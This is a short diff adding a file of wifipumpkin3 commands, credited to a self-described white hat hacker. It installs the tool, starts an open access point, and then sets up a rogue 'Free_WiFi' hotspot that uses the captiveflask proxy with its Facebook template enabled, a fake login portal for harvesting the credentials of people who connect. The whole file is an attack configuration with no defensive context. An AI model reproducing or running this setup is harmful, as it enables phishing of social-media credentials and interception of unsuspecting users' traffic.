@@ -1,0 +1,15 @@
+pakistani white hat hacker mr sabaz ali khan
+sudo apt install wifipumpkin3
+set interface wlan0
+set ssid white hat hacker wifi
+ap
+set security false
+set proxy no proxy
+ignore pydns_server
+start
+
+set interface wlan0
+set ssid Free_WiFi
+set proxy captiveflask
+set captiveflask.facebook true
+start
